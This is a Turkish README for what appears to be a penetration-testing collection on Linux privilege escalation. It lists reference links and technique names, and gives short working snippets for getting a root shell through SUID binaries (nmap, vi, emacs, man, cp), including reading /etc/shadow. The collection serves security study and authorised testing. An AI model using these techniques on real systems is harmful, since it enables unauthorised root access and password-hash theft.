# Linux Yetki Yükseltme (Privilege Escalation)

Sağda solda denk geldiğim ve yetki yükseltme için işe yarayabilecek scriptler. Linux ve unix sistemler için konfigürasyon eksikliklerine ve yetki yükseltmeye sebep olabilecek zafiyetlere bakıyorlar.

tools klasörünün altında README dosyaları ile beraber bulunmakta.

## Bakılabilecek kaynaklar
- https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
- http://netsec.ws/?p=309
- https://n0where.net/linux-post-exploitation/
- https://highon.coffee/blog/linux-commands-cheat-sheet/
- http://www.rebootuser.com/?p=1623
- http://pentestmonkey.net/tools/audit/unix-privesc-check


## Manuel kontrol

- Shell Escape Sequences
- IFS Exploit
- LD_PRELOAD Exploit
- Symlinks

bkz -> http://www.dankalia.com/tutor/01005/0100501004.htm

## SUID bit 

````
- emacs - by entering alt+!
- vi - by entering :![commandname]
- man - by entering![command name] replacing [command name] with the program you wish to run.
````
````
Nmap setuid privesc

  nmap --script <(echo 'os.execute("/bin/sh")')
  Starting Nmap 7.01 ( https://nmap.org ) at 2016-05-03 10:29 EEST
  NSE: Warning: Loading '/dev/fd/63' -- the recommended file extension is '.nse'.
  # root  > komut olarak 'whoami' girdim
  # uid=0(root) gid=0(root) groups=0(root),141(lpadmin)  > komut olarak 'id' girdim

  > buradaki sıkıntı, komut olarak yazılanların görünmemesidir. Fakat çıktı kesintisiz bir şekilde ekrana dökülmektedir.
````

````
  nmap --interactive
  > !whoami              # root
  > !cat /etc/shadow     # SUCCESS: prints out hashed passwords
  > !bash                # SUCCESS: launches root shell
  bkz -> https://gist.github.com/dergachev/7916152
````

````
-rwsr-xr-x 1 root root 124932 Jan 14  2015 /bin/cp
cp komutu SUID biti etkin. Bu durumda /etc/passwd veya /etc/shadow dosyaları kullanılarak root olunabilir.
ayrıntılı bilgi için;
bkz -> http://yunusyildirim.blogspot.com.tr/2016/04/kevgir-vm-cozum-walkthrough.html
````
